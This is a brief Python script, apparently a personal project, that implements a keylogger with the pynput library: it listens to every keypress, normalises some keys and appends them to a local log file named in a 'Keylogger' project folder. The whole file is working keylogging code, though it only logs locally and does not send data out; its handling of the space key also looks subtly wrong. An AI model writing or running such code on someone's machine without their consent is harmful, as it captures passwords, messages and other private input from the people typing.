from pynput.keyboard import Listener
import re


arquivolog = "\Projects Development\Keylogger\log.txt"


def capture(key):
    key = str(key)
    key = re.sub(r'\'', ' ', key)
    key = re.sub(r'Key.Space', ' ',key)
    key = re.sub(r'Key.enter', '\n ',key)

    print(key)

    with open(arquivolog, "a") as log:
        log.write(key)

with Listener(on_press=capture) as l:
    l.join()

